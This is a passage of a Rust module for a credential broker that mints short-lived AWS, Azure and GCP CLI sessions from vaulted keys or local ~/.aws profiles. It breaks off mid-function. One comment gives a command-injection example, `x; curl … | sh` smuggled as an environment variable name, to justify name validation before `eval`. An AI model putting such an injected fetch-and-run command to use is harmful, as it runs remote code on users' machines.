//! Short-lived cloud CLI sessions.
//!
//! Cloud connections hold long-lived identity in the vault. Agents mint
//! temporary credentials through `/v1/cloud/session`; Multitool never returns
//! the vaulted long-lived keys. Minted material is intentionally short-lived
//! (15m–1h) — there is no cloud-side revocation of already-issued sessions.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use chrono::{DateTime, Utc};
use serde::Serialize;
use serde_json::json;
use url::Url;
use zeroize::Zeroizing;

use uuid::Uuid;

use crate::repository::{CatalogRepository, WorkspaceContext};
use crate::sigv4::{self, SignParams};
use crate::types::{CloudProvider, Connection, ConnectionConfig};

/// A minted cloud session ready for an agent / stock CLI.
///
/// Deserializable because a session can arrive from elsewhere: see
/// [`PushedSessions`].
#[derive(Debug, Clone, Serialize, serde::Deserialize)]
pub struct CloudSession {
    pub provider: String,
    pub connection: String,
    /// RFC3339 expiry of the minted material.
    pub expires_at: String,
    pub expires_in_seconds: u64,
    /// Shell exports (`KEY=value` lines) for `eval "$(aka env …)"`.
    pub env: Vec<(String, String)>,
    /// Provider-specific payload (AWS process JSON fields, etc.).
    pub credentials: serde_json::Value,
}

/// Why minting failed: configuration vs transient upstream.
#[derive(Debug)]
pub enum CloudMintError {
    Config(String),
    Upstream(String),
}

impl std::fmt::Display for CloudMintError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Config(message) | Self::Upstream(message) => f.write_str(message),
        }
    }
}

/* ---------------------------- AWS profiles -------------------------------- */

/// One entry in a machine's AWS config, described for the picker. Never
/// carries key material — only what the UI needs to offer a choice.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct AwsProfileInfo {
    pub name: String,
    /// `keys` (static, mintable), `temporary` (needs a role), `sso`
    /// (Identity Center; the cached session is not readable), or
    /// `incomplete`.
    pub kind: String,
    pub region: Option<String>,
}

/// Resolved static credentials for one profile, read at mint time.
pub(crate) struct AwsProfileKeys {
    access_key: Zeroizing<String>,
    secret_key: Zeroizing<String>,
    session_token: Option<Zeroizing<String>>,
    region: Option<String>,
}

fn aws_file_path(env_var: &str, leaf: &str) -> Option<PathBuf> {
    if let Some(path) = std::env::var_os(env_var).filter(|value| !value.is_empty()) {
        return Some(PathBuf::from(path));
    }
    dirs::home_dir().map(|home| home.join(".aws").join(leaf))
}

/// Minimal INI: `[section]` headers and `key = value` pairs. Nested blocks
/// (indented lines, used by `s3 =`-style sub-settings) are skipped — nothing
/// minting needs lives in them.
fn parse_aws_ini(text: &str) -> Vec<(String, BTreeMap<String, String>)> {
    let mut sections: Vec<(String, BTreeMap<String, String>)> = Vec::new();
    for raw in text.lines() {
        if raw.starts_with([' ', '\t']) {
            continue;
        }
        let line = raw.trim();
        if line.is_empty() || line.starts_with(['#', ';']) {
            continue;
        }
        if let Some(name) = line
            .strip_prefix('[')
            .and_then(|rest| rest.strip_suffix(']'))
        {
            sections.push((name.trim().to_string(), BTreeMap::new()));
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        if let Some((_, props)) = sections.last_mut() {
            props.insert(key.trim().to_ascii_lowercase(), value.trim().to_string());
        }
    }
    sections
}

/// Merge `~/.aws/credentials` (sections are profile names) and
/// `~/.aws/config` (sections are `profile <name>`, except `default`), with
/// credentials-file values winning where both name a key.
fn aws_profiles_from_files(
    credentials: Option<&Path>,
    config: Option<&Path>,
) -> BTreeMap<String, BTreeMap<String, String>> {
    let mut profiles: BTreeMap<String, BTreeMap<String, String>> = BTreeMap::new();
    if let Some(text) = config.and_then(|path| std::fs::read_to_string(path).ok()) {
        for (section, props) in parse_aws_ini(&text) {
            let name = section
                .strip_prefix("profile ")
                .unwrap_or(section.as_str())
                .to_string();
            profiles.entry(name).or_default().extend(props);
        }
    }
    if let Some(text) = credentials.and_then(|path| std::fs::read_to_string(path).ok()) {
        for (section, props) in parse_aws_ini(&text) {
            profiles.entry(section).or_default().extend(props);
        }
    }
    profiles
}

fn aws_profile_kind(props: &BTreeMap<String, String>) -> &'static str {
    let has = |key: &str| props.get(key).is_some_and(|value| !value.is_empty());
    if has("aws_access_key_id") && has("aws_secret_access_key") {
        if has("aws_session_token") {
            "temporary"
        } else {
            "keys"
        }
    } else if has("sso_start_url") || has("sso_session") {
        "sso"
    } else {
        "incomplete"
    }
}

fn aws_profiles_map() -> BTreeMap<String, BTreeMap<String, String>> {
    aws_profiles_from_files(
        aws_file_path("AWS_SHARED_CREDENTIALS_FILE", "credentials").as_deref(),
        aws_file_path("AWS_CONFIG_FILE", "config").as_deref(),
    )
}

/// Which install this broker is, for deciding whether a profile
/// connection's files are readable here, and where pushed sessions live
/// when they are not.
pub struct InstallContext<'a> {
    /// [`crate::paths::Paths::install_id`] of the running broker.
    pub id: &'a str,
    pub pushed: &'a PushedSessions,
}

/// Sessions minted elsewhere and handed to this broker to serve.
///
/// A connection whose `~/.aws` lives on another machine cannot be minted
/// here: the files are not ours to read. The app on the origin machine
/// mints instead and pushes the result, and this holds the latest one per
/// connection until it expires.
///
/// In memory on purpose. Everything here expires within the hour anyway,
/// and a broker restart should not resurrect credentials whose owner may
/// have gone away in the meantime — the origin app re-pushes as soon as it
/// notices, which is the same path a first push takes.
#[derive(Default)]
pub struct PushedSessions {
    by_connection: std::sync::Mutex<std::collections::HashMap<Uuid, PushedSession>>,
}

struct PushedSession {
    session: CloudSession,
    expires_at: DateTime<Utc>,
}

/// How much life a pushed session must have left to be worth serving.
///
/// Handing an agent a session with three seconds on it is a failure with
/// extra steps: it will start work it cannot finish. The origin app
/// refreshes well inside this, so reaching it means that app is gone.
const PUSHED_SESSION_FLOOR: chrono::TimeDelta = chrono::TimeDelta::seconds(60);

/// How much life a pushed session may carry: the broker's own TTL ceiling
/// plus slack for clock skew between the minting machine and this one.
///
/// "The broker never holds anything that outlives the hour" is this
/// module's promise, and the mint path keeps it by clamping the requested
/// TTL — so a push whose expiry runs materially past the ceiling is either
/// a clock problem or a client minting outside the rules, and holding it
/// would make this broker serve it for however long it claims.
const PUSHED_SESSION_CEILING: chrono::TimeDelta =
    chrono::TimeDelta::seconds(crate::types::MAX_CLOUD_SESSION_TTL_SECS as i64 + 300);

/// Whether a name is a plain shell/POSIX environment variable name.
///
/// The documented way to use a session is `eval "$(aka env …)"`,
/// which makes every exported name shell source. Values are quoted at the
/// print site; a name cannot be, so it has to be a name and nothing else —
/// otherwise `x; curl … | sh` is an export line. Broker-minted sessions only
/// ever use fixed names, but a pushed one arrives over the manage plane.
pub fn is_env_var_name(name: &str) -> bool {
    let mut chars = name.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

impl PushedSessions {
    pub fn store(&self, connection: Uuid, session: CloudSession) -> Result<(), CloudMintError> {
        if let Some((name, _)) = session.env.iter().find(|(name, _)| !is_env_var_name(name)) {
            return Err(CloudMintError::Config(format!(
                "pushed session exports {name:?}, which is not an environment \
                 variable name"
            )));
        }
        let expires_at = DateTime::parse_from_rfc3339(&session.expires_at)
            .map(|value| value.with_timezone(&Utc))
            .map_err(|_| {
                CloudMintError::Config(format!(
                    "pushed session has an unreadable expiry {:?}",
                    session.expires_at
                ))
            })?;
        if expires_at - Utc::now() <= PUSHED_SESSION_FLOOR {
            return Err(CloudMintError::Config(
                "pushed session is already expiring; mint a fresh one".to_string(),
            ));
        }
        if expires_at - Utc::now() > PUSHED_SESSION_CEILING {
            return Err(CloudMintError::Config(format!(
                "pushed session expires at {}, past the broker's {}-second \
                 session ceiling",
                session.expires_at,
                crate::types::MAX_CLOUD_SESSION_TTL_SECS
            )));
        }
        self.by_connection
            .lock()
            .unwrap_or_else(|poison| poison.into_inner())
            .insert(
                connection,
                PushedSession {
                    session,
                    expires_at,
                },
            );
        Ok(())
    }

    /// The live session for a connection, with its remaining seconds
    /// recomputed — `expires_in_seconds` was true when it was minted, not
    /// when it is served.
    fn take_live(&self, connection: Uuid) -> Option<CloudSession> {
        let mut sessions = self
            .by_connection
            .lock()
            .unwrap_or_else(|poison| poison.into_inner());
        let held = sessions.get(&connection)?;
        let remaining = held.expires_at - Utc::now();
        if remaining <= PUSHED_SESSION_FLOOR {
            sessions.remove(&connection);
            return None;
        }
        Some(CloudSession {
            expires_in_seconds: remaining.num_seconds().max(0) as u64,
            provider: held.session.provider.clone(),
            connection: held.session.connection.clone(),
            expires_at: held.session.expires_at.clone(),
            env: held.session.env.clone(),
            credentials: held.session.credentials.clone(),
        })
    }

    /// Whether a connection currently has a servable session, and for how
    /// much longer — what the UI needs to say "expires in 42 min" or
    /// "waiting for the app on <machine>".
    pub fn remaining_seconds(&self, connection: Uuid) -> Option<u64> {
        let sessions = self
            .by_connection
            .lock()
            .unwrap_or_else(|poison| poison.into_inner());
        let held = sessions.get(&connection)?;
        let remaining = held.expires_at - Utc::now();
        (remaining > PUSHED_SESSION_FLOOR).then(|| remaining.num_seconds().max(0) as u64)
    }

    pub fn forget(&self, connection: Uuid) {
        self.by_connection
            .lock()
            .unwrap_or_else(|poison| poison.into_inner())
            .remove(&connection);
    }
}

/// How to name the home whose `~/.aws` was read, for messages that ask the
/// user to go back to that machine.
pub fn aws_home_label() -> String {
    dirs::home_dir()
        .map(|home| home.display().to_string())
        .unwrap_or_else(|| "this machine".into())
}

/// The AWS profiles readable from this machine's `~/.aws`, for the picker.
///
/// Whoever calls this is the machine those files belong to: the desktop app
/// enumerates its own home even when the broker it manages is hosted, which
/// is what makes a reuse connection possible against a remote broker at all.
pub fn list_aws_profiles() -> Vec<AwsProfileInfo> {
    aws_profiles_map()
        .into_iter()
        .map(|(name, props)| AwsProfileInfo {
            kind: aws_profile_kind(&props).to_string(),
            region: props.get("region").filter(|r| !r.is_empty()).cloned(),
            name,
        })
        .collect()
}

fn aws_profile_keys(profile: &str) -> Result<AwsProfileKeys, CloudMintError> {
    let mut profiles = aws_profiles_map();
    let Some(props) = profiles.remove(profile) else {
        return Err(CloudMintError::Config(format!(
            "AWS profile {profile:?} was not found in ~/.aws \
             (is the broker running as the signed-in user?)"
        )));
    };
    match aws_profile_kind(&props) {
        "sso" => Err(CloudMintError::Config(format!(
            "AWS profile {profile:?} signs in through IAM Identity Center; \
             Multitool cannot read its cached session. Use a profile with \
             static keys, or a role it can assume from one."
        ))),
        "incomplete" => Err(CloudMintError::Config(format!(
            "AWS profile {profile:?} carries no static access keys"
        ))),
        _ => {
            let get = |key: &str| props.get(key).cloned().map(Zeroizing::new);
            Ok(AwsProfileKeys {
                access_key: get("aws_access_key_id").expect("kind checked"),
                secret_key: get("aws_secret_access_key").expect("kind checked"),
                session_token: get("aws_session_token"),
                region: props.get("region").filter(|r| !r.is_empty()).cloned(),
            })
        }
    }
}

/// Who a minted session's credentials belong to, for the test/verify surface.
///
/// AWS answers with the caller ARN from `sts:GetCallerIdentity` — the one
/// STS call every principal may make — so the user sees which account and
/// principal this connection is actually wired to. Azure and GCP sessions
/// already carry their identity coordinates; no extra call is spent.
pub async fn session_identity(
    client: &reqwest::Client,
    session: &CloudSession,
) -> Result<Option<String>, CloudMintError> {
    let field = |name: &str| {
        session
            .credentials
            .get(name)
            .and_then(|value| value.as_str())
            .map(str::to_string)
    };
    match session.provider.as_str() {
        "aws" => aws_caller_identity(client, session).await.map(Some),
        "gcp" => Ok(field("client_email")),
        "azure" => Ok(match (field("client_id"), field("tenant_id")) {
            (Some(client_id), Some(tenant_id)) => {
                Some(format!("client {client_id} in tenant {tenant_id}"))
            }
            _ => None,
        }),
        _ => Ok(None),
    }
}

/// `sts:GetCallerIdentity`, signed with the *minted* temporary credentials.
async fn aws_caller_identity(
    client: &reqwest::Client,
    session: &CloudSession,
) -> Result<String, CloudMintError> {
    let credential = |name: &str| {
        session
            .credentials
            .get(name)
            .and_then(|value| value.as_str())
            .ok_or_else(|| CloudMintError::Config(format!("the minted session carries no {name}")))
    };
    let access_key = credential("AccessKeyId")?;
    let secret_key = credential("SecretAccessKey")?;
    let session_token = credential("SessionToken")?;
    let region = session
        .env
        .iter()
        .find(|(name, _)| name == "AWS_DEFAULT_REGION")
        .map(|(_, value)| value.as_str())
        .unwrap_or("us-east-1");

    let body = "Action=GetCallerIdentity&Version=2011-06-15";
    let payload_hash = sigv4::sha256_hex(body.as_bytes());
    let url = sts_endpoint_url(region)?;
    let host = url
        .host_str()
        .ok_or_else(|| CloudMintError::Config("STS endpoint has no host".to_string()))?
        .to_string();
    let host = match url.port() {
        Some(port) => format!("{host}:{port}"),
        None => host,
    };
    let amz_date = Utc::now().format("%Y%m%dT%H%M%SZ").to_string();
    let signed_headers = vec![
        ("host".to_string(), host),
        (
            "content-type".to_string(),
            "application/x-www-form-urlencoded".to_string(),
        ),
        ("x-amz-content-sha256".to_string(), payload_hash.clone()),
        ("x-amz-date".to_string(), amz_date.clone()),
        (
            "x-amz-security-token".to_string(),
            session_token.to_string(),
        ),
    ];
    let signature = sigv4::sign(&SignParams {
        access_key: &access_key,
        secret_key: &secret_key,
        region,
        service: "sts",
        method: "POST",
        url: &url,
        headers: &signed_headers,
        payload_hash: &payload_hash,
        timestamp: &amz_date,
    });
    let response = client
        .post(url)
        .header("content-type", "application/x-www-form-urlencoded")
        .header("x-amz-content-sha256", &payload_hash)
        .header("x-amz-date", &amz_date)
        .header("x-amz-security-token", session_token)
        .header("authorization", &signature.authorization)
        .body(body)
        .send()
        .await
        .map_err(|error| {
            CloudMintError::Upstream(format!(
                "AWS STS could not be reached for GetCallerIdentity: {}",
                error.without_url()
            ))
        })?;
    let status = response.status();
    let text = response.text().await.map_err(|_| {
        CloudMintError::Upstream("AWS STS answered GetCallerIdentity unreadably".to_string())
    })?;
    if !status.is_success() {
        let detail = xml_tag(&text, "Message")
            .or_else(|| xml_tag(&text, "Code"))
            .unwrap_or_else(|| text.chars().take(200).collect());
        return Err(CloudMintError::Upstream(format!(
            "GetCallerIdentity failed ({status}): {detail}"
        )));
    }
    xml_tag(&text, "Arn")
        .ok_or_else(|| CloudMintError::Upstream("GetCallerIdentity returned no Arn".to_string()))
}

/// What approving one mint hands over, in the broker's words. Unlike an
/// HTTP approval, the broker never sees the traffic these credentials
/// authorize: once issued they work anywhere until they expire.
pub(crate) const MINT_CONSEQUENCE: &str =
    "Hands the agent temporary cloud credentials, confirmed once per minted session. \
     Multitool cannot see how they are used or revoke them before they expire.";

/// Mint a short-lived session for a cloud connection.
pub async fn mint_session(
    store: &Arc<dyn CatalogRepository>,
    workspace: &WorkspaceContext,
    client: &reqwest::Client,
    connection: &Connection,
    // Role session name / audit label (agent name); sanitized for AWS.
    session_name: &str,
    // This install's identity and its pushed-session cache, for connections
    // whose credentials belong to a different install.
    install: &InstallContext<'_>,
) -> Result<CloudSession, CloudMintError> {
    let ConnectionConfig::Cloud { provider } = &connection.config else {
        return Err(CloudMintError::Config("not a cloud connection".to_string()));
    };
    match provider {
        CloudProvider::Aws {
            region,
            access_key_ref,
            secret_key_ref,
            session_token_ref,
            role_arn,
            external_id,
            session_ttl_secs: _,
        } => {
            mint_aws(
                store,
                workspace,
                client,
                &connection.name,
                region,
                access_key_ref,
                secret_key_ref,
                session_token_ref.as_deref(),
                role_arn.as_deref(),
                external_id.as_deref(),
                provider.session_ttl_secs(),
                session_name,
            )
            .await
        }
        CloudProvider::AwsProfile {
            region,
            profile,
            origin,
            origin_label,
            role_arn,
            external_id,
            session_policy_arn,
            session_policy,
            session_ttl_secs: _,
        } => {
            // Not our files to read. Serve what the owning install pushed,
            // or say plainly that it needs to be running — substituting
            // this broker's own ~/.aws would silently mean another account.
            //
            // "Not ours" is per install root, so the owner can be the app
            // beside this broker on one machine as much as a laptop behind a
            // hosted one. The message names the home the connection was
            // created from rather than promising a different computer.
            if origin.is_empty() || origin != install.id {
                return install.pushed.take_live(connection.id).ok_or_else(|| {
                    let where_ = match origin_label.as_deref() {
                        Some(label) => format!("the Multitool install at {label}"),
                        None => "the Multitool install that owns it".to_string(),
                    };
                    CloudMintError::Config(format!(
                        "this connection mints from the {profile:?} AWS profile in \
                             {where_}. Open Multitool there to refresh it — this broker \
                             cannot read those credentials."
                    ))
                });
            }
            let keys = aws_profile_keys(profile)?;
            let region = region
                .clone()
                .filter(|value| !value.trim().is_empty())
                .or_else(|| keys.region.clone())
                .ok_or_else(|| {
                    CloudMintError::Config(format!(
                        "AWS profile {profile:?} names no region; set one on the connection"
                    ))
                })?;
            mint_aws_session(
                client,
                &connection.name,
                &region,
                keys,
                role_arn.as_deref(),
                external_id.as_deref(),
                session_policy_arn.as_deref(),
                session_policy.as_deref(),
                provider.session_ttl_secs(),
                session_name,
            )
            .await
        }
        CloudProvider::Azure {
            tenant_id,
            client_id,
            client_secret_ref,
            subscription_id,
            scope,
            session_ttl_secs: _,
        } => {
            mint_azure(
                store,
                workspace,
                client,
                &connection.name,
                tenant_id,
                client_id,
                client_secret_ref,
                subscription_id.as_deref(),
                scope,
            )
            .await
        }
        CloudProvider::Gcp {
            key_ref,
            scope,
            project,
            session_ttl_secs: _,
        } => {
            mint_gcp(
                store,
                workspace,
                client,
                &connection.name,
                connection.id,
                key_ref,
                scope,
                project.as_deref(),
            )
            .await
        }
    }
}

async fn vault_secret(
    store: &Arc<dyn CatalogRepository>,
    workspace: &WorkspaceContext,
    name: &str,
) -> Result<Zeroizing<String>, CloudMintError> {
    // The stored value is used verbatim: trimming here silently corrupted
    // any secret whose whitespace is meaningful, and a wrong credential
    // should fail loudly at the provider rather than be quietly rewritten.
    store
        .secret_value_by_name(workspace, name)
        .await
        .map_err(|error| {
            CloudMintError::Config(format!("signer credential {name:?} unavailable: {error}"))
        })
}

async fn mint_aws(
    store: &Arc<dyn CatalogRepository>,
    workspace: &WorkspaceContext,
    client: &reqwest::Client,
    connection_name: &str,
    region: &str,
    access_key_ref: &str,
    secret_key_ref: &str,
    session_token_ref: Option<&str>,
    role_arn: Option<&str>,
    external_id: Option<&str>,
    duration_secs: u64,
    session_name: &str,
) -> Result<CloudSession, CloudMintError> {
    if region.trim().is_empty() {
        return Err(CloudMintError::Config(
            "an AWS cloud connection needs a region".to_string(),
        ));
    }
    let keys = AwsProfileKeys {
        access_key: vault_secret(store, workspace, access_key_ref).await?,
        secret_key: vault_secret(store, workspace, secret_key_ref).await?,
        session_token: match session_token_ref {
            Some(name) => Some(vault_secret(store, workspace, name).await?),
            None => None,
        },
        region: None,
    };
    mint_aws_session(
        client,
        connection_name,
        region,
        keys,
        role_arn,
        external_id,
        None,
        None,
        duration_secs,
        session_name,
    )
    .await
}

/// Mint one session straight from a local profile, for the machine that
/// owns it to push to a broker that cannot read those files.
///
/// The same call the local mint path makes, minus the connection lookup:
/// the caller already knows the parameters and only needs the result.
#[allow(clippy::too_many_arguments)]
pub async fn mint_aws_profile_session(
    client: &reqwest::Client,
    connection_name: &str,
    profile: &str,
    region: Option<&str>,
    role_arn: Option<&str>,
    external_id: Option<&str>,
    session_policy_arn: Option<&str>,
    session_policy: Option<&str>,
    duration_secs: u64,
    session_name: &str,
) -> Result<CloudSession, CloudMintError> {
    let keys = aws_profile_keys(profile)?;
    let region = region
        .map(str::to_string)
        .filter(|value| !value.trim().is_empty())
        .or_else(|| keys.region.clone())
        .ok_or_else(|| {
            CloudMintError::Config(format!(
                "AWS profile {profile:?} names no region; set one on the connection"
            ))
        })?;
    mint_aws_session(
        client,
        connection_name,
        &region,
        keys,
        role_arn,
        external_id,
        session_policy_arn,
        session_policy,
        duration_secs,
        session_name,
    )
    .await
}

/// The STS Query form for one mint. Which action fires is the attenuation
/// story in miniature:
///
/// - a role means `AssumeRole` (policy params bound the session further);
/// - no role but a policy means `GetFederationToken`, whose sessions hold
///   the *intersection* of the caller and the policy — AWS enforces the
///   leash, not the broker;
/// - neither means `GetSessionToken`, a plain re-key of the caller.
///
/// Temporary caller material (a session token) can only take the role path:
/// STS refuses GetSessionToken/GetFederationToken from temporary
/// credentials, and re-exporting them would hand agents an unbounded token.
fn aws_sts_form(
    role_arn: Option<&str>,
    external_id: Option<&str>,
    session_policy_arn: Option<&str>,
    session_policy: Option<&str>,
    duration_secs: u64,
    session_name: &str,
    caller_is_temporary: bool,
) -> Result<Vec<(String, String)>, CloudMintError> {
    let mut form = vec![
        ("Version".to_string(), "2011-06-15".to_string()),
        ("DurationSeconds".to_string(), duration_secs.to_string()),
    ];
    let policy_arn = session_policy_arn.filter(|arn| !arn.trim().is_empty());
    let policy = session_policy.filter(|json| !json.trim().is_empty());
    let push_policy_params = |form: &mut Vec<(String, String)>| {
        if let Some(arn) = policy_arn {
            form.push(("PolicyArns.member.1.arn".to_string(), arn.to_string()));
        }
        if let Some(json) = policy {
            form.push(("Policy".to_string(), json.to_string()));
        }
    };
    if caller_is_temporary && role_arn.is_none() {
        return Err(CloudMintError::Config(
            "these AWS keys are temporary session credentials; set a \
             role_arn so Multitool can AssumeRole into a short-lived session"
                .to_string(),
        ));
    }
    if let Some(role_arn) = role_arn {
        if role_arn.trim().is_empty() {
            return Err(CloudMintError::Config(
                "role_arn cannot be blank".to_string(),
            ));
        }
        form.push(("Action".to_string(), "AssumeRole".to_string()));
        form.push(("RoleArn".to_string(), role_arn.to_string()));
        form.push((
            "RoleSessionName".to_string(),
            sanitize_role_session_name(session_name),
        ));
        if let Some(external_id) = external_id.filter(|id| !id.trim().is_empty()) {
            form.push(("ExternalId".to_string(), external_id.to_string()));
        }
        push_policy_params(&mut form);
    } else if policy_arn.is_some() || policy.is_some() {
        form.push(("Action".to_string(), "GetFederationToken".to_string()));
        // Federation names cap at 32 chars (role session names allow 64).
        form.push((
            "Name".to_string(),
            sanitize_role_session_name(session_name)
                .chars()
                .take(32)
                .collect(),
        ));
        push_policy_params(&mut form);
    } else {
        form.push(("Action".to_string(), "GetSessionToken".to_string()));
    }
    Ok(form)
}

#[allow(clippy::too_many_arguments)]
async fn mint_aws_session(
    client: &reqwest::Client,
    connection_name: &str,
    region: &str,
    keys: AwsProfileKeys,
    role_arn: Option<&str>,
    external_id: Option<&str>,
    session_policy_arn: Option<&str>,
    session_policy: Option<&str>,
    duration_secs: u64,
    session_name: &str,
) -> Result<CloudSession, CloudMintError> {
    let access_key = keys.access_key;
    let secret_key = keys.secret_key;
    let caller_token = keys.session_token;
    let form = aws_sts_form(
        role_arn,
        external_id,
        session_policy_arn,
        session_policy,
        duration_secs,
        session_name,
        caller_token.is_some(),
    )?;

    let body = form
        .iter()
        .map(|(k, v)| format!("{}={}", percent_encode_form(k), percent_encode_form(v)))
        .collect::<Vec<_>>()
        .join("&");
    let body_bytes = body.as_bytes();
    let payload_hash = sigv4::sha256_hex(body_bytes);

    // Tests may redirect STS to a loopback fixture via MULTITOOL_TEST_AWS_STS_URL.
    let url = sts_endpoint_url(region)?;
    let host = url
        .host_str()
        .ok_or_else(|| CloudMintError::Config("STS endpoint has no host".to_string()))?
        .to_string();
    let host = match url.port() {
        Some(port) => format!("{host}:{port}"),
        None => host,
    };
    let amz_date = Utc::now().format("%Y%m%dT%H%M%SZ").to_string();
    let mut signed_headers = vec![
        ("host".to_string(), host.clone()),
        (
            "content-type".to_string(),
            "application/x-www-form-urlencoded".to_string(),
        ),
        ("x-amz-content-sha256".to_string(), payload_hash.clone()),
        ("x-amz-date".to_string(), amz_date.clone()),
    ];
    if let Some(token) = &caller_token {
        signed_headers.push(("x-amz-security-token".to_string(), token.to_string()));
    }
    let signature = sigv4::sign(&SignParams {
        access_key: &access_key,
        secret_key: &secret_key,
        region,
        service: "sts",
        method: "POST",
        url: &url,
        headers: &signed_headers,
        payload_hash: &payload_hash,
        timestamp: &amz_date,
    });

    let mut request = client
        .post(url)
        .header("content-type", "application/x-www-form-urlencoded")
        .header("x-amz-content-sha256", &payload_hash)
        .header("x-amz-date", &amz_date)
        .header("authorization", &signature.authorization)
        .body(body);
    if let Some(token) = &caller_token {
        request = request.header("x-amz-security-token", token.as_str());
    }
    let response = request.send().await.map_err(|error| {
        CloudMintError::Upstream(format!(
            "AWS STS could not be reached: {}",
            error.without_url()
        ))
    })?;
    let status = response.status();
    let text = response.text().await.map_err(|_| {
        CloudMintError::Upstream("AWS STS answered without a readable body".to_string())
    })?;
    if !status.is_success() {
        let detail = xml_tag(&text, "Message")
            .or_else(|| xml_tag(&text, "Code"))
            .unwrap_or_else(|| text.chars().take(200).collect());
        return Err(CloudMintError::Upstream(format!(
            "AWS STS refused the session ({status}): {detail}"
        )));
    }

    let access_key_id = xml_tag(&text, "AccessKeyId")
        .ok_or_else(|| CloudMintError::Upstream("AWS STS returned no AccessKeyId".to_string()))?;
    let secret_access_key = xml_tag(&text, "SecretAccessKey").ok_or_else(|| {
        CloudMintError::Upstream("AWS STS returned no SecretAccessKey".to_string())
    })?;
    let session_token = xml_tag(&text, "SessionToken")
        .ok_or_else(|| CloudMintError::Upstream("AWS STS returned no SessionToken".to_string()))?;
    let expiration = xml_tag(&text, "Expiration")
        .ok_or_else(|| CloudMintError::Upstream("AWS STS returned no Expiration".to_string()))?;
    let expires_at = DateTime::parse_from_rfc3339(&expiration)
        .map(|dt| dt.with_timezone(&Utc))
        .map_err(|_| {
            CloudMintError::Upstream(format!(
                "AWS STS returned an unreadable Expiration {expiration:?}"
            ))
        })?;
    let expires_in = expires_at
        .signed_duration_since(Utc::now())
        .num_seconds()
        .max(0) as u64;

    // AWS credential_process JSON (Version 1).
    let credentials = json!({
        "Version": 1,
        "AccessKeyId": access_key_id,
        "SecretAccessKey": secret_access_key,
        "SessionToken": session_token,
        "Expiration": expiration,
    });

    let env = vec![
        ("AWS_ACCESS_KEY_ID".to_string(), access_key_id),
        ("AWS_SECRET_ACCESS_KEY".to_string(), secret_access_key),
        ("AWS_SESSION_TOKEN".to_string(), session_token),
        ("AWS_DEFAULT_REGION".to_string(), region.to_string()),
        ("AWS_REGION".to_string(), region.to_string()),
        // Clear profile so the minted keys win over a local profile chain.
        ("AWS_PROFILE".to_string(), String::new()),
    ];

    Ok(CloudSession {
        provider: "aws".to_string(),
        connection: connection_name.to_string(),
        expires_at: expires_at.to_rfc3339(),
        expires_in_seconds: expires_in,
        env,
        credentials,
    })
}

async fn mint_azure(
    store: &Arc<dyn CatalogRepository>,
    workspace: &WorkspaceContext,
    client: &reqwest::Client,
    connection_name: &str,
    tenant_id: &str,
    client_id: &str,
    client_secret_ref: &str,
    subscription_id: Option<&str>,
    scope: &str,
) -> Result<CloudSession, CloudMintError> {
    if tenant_id.trim().is_empty() || client_id.trim().is_empty() {
        return Err(CloudMintError::Config(
            "an Azure cloud connection needs tenant_id and client_id".to_string(),
        ));
    }
    if scope.trim().is_empty() {
        return Err(CloudMintError::Config(
            "an Azure cloud connection needs an OAuth scope".to_string(),
        ));
    }
    let client_secret = vault_secret(store, workspace, client_secret_ref).await?;
    let token_url = azure_token_url(tenant_id)?;
    let response = client
        .post(token_url)
        .form(&[
            ("grant_type", "client_credentials"),
            ("client_id", client_id),
            ("client_secret", client_secret.as_str()),
            ("scope", scope),
        ])
        .send()
        .await
        .map_err(|error| {
            CloudMintError::Upstream(format!(
                "Entra token endpoint could not be reached: {}",
                error.without_url()
            ))
        })?;
    let status = response.status();
    let body: serde_json::Value = response.json().await.map_err(|_| {
        CloudMintError::Upstream("Entra token endpoint answered unreadably".to_string())
    })?;
    if !status.is_success() {
        let detail = body
            .get("error_description")
            .or_else(|| body.get("error"))
            .and_then(|v| v.as_str())
            .unwrap_or("no detail");
        return Err(CloudMintError::Upstream(format!(
            "Entra refused the client-credentials grant ({status}): {detail}"
        )));
    }
    let access_token = body
        .get("access_token")
        .and_then(|v| v.as_str())
        .ok_or_else(|| CloudMintError::Upstream("Entra returned no access_token".to_string()))?;
    let expires_in = body
        .get("expires_in")
        .and_then(|v| v.as_u64())
        .or_else(|| {
            body.get("expires_in")
                .and_then(|v| v.as_str())
                .and_then(|s| s.parse().ok())
        })
        .unwrap_or(3600);
    let expires_at = Utc::now() + chrono::Duration::seconds(expires_in as i64);

    let credentials = json!({
        "token_type": body.get("token_type").and_then(|v| v.as_str()).unwrap_or("Bearer"),
        "access_token": access_token,
        "expires_in": expires_in,
        "expires_on": expires_at.timestamp(),
        "resource": scope,
        "tenant_id": tenant_id,
        "client_id": client_id,
        "subscription_id": subscription_id,
    });

    let mut env = vec![
        ("AZURE_TENANT_ID".to_string(), tenant_id.to_string()),
        ("AZURE_CLIENT_ID".to_string(), client_id.to_string()),
        ("AZURE_ACCESS_TOKEN".to_string(), access_token.to_string()),
        // Common aliases for tools that read ARM_* rather than AZURE_*.
        ("ARM_TENANT_ID".to_string(), tenant_id.to_string()),
        ("ARM_CLIENT_ID".to_string(), client_id.to_string()),
        ("ARM_ACCESS_TOKEN".to_string(), access_token.to_string()),
    ];
    if let Some(sub) = subscription_id.filter(|s| !s.trim().is_empty()) {
        env.push(("AZURE_SUBSCRIPTION_ID".to_string(), sub.to_string()));
        env.push(("ARM_SUBSCRIPTION_ID".to_string(), sub.to_string()));
    }

    Ok(CloudSession {
        provider: "azure".to_string(),
        connection: connection_name.to_string(),
        expires_at: expires_at.to_rfc3339(),
        expires_in_seconds: expires_in,
        env,
        credentials,
    })
}

async fn mint_gcp(
    store: &Arc<dyn CatalogRepository>,
    workspace: &WorkspaceContext,
    client: &reqwest::Client,
    connection_name: &str,
    connection_id: uuid::Uuid,
    key_ref: &str,
    scope: &str,
    project: Option<&str>,
) -> Result<CloudSession, CloudMintError> {
    if scope.trim().is_empty() {
        return Err(CloudMintError::Config(
            "a GCP cloud connection needs an OAuth scope".to_string(),
        ));
    }
    let key_json = vault_secret(store, workspace, key_ref).await?;
    let cache_key = format!("{connection_id}\0{key_ref}\0{scope}");
    let bearer = crate::gcp_signer::fresh_bearer(client, &key_json, scope, &cache_key)
        .await
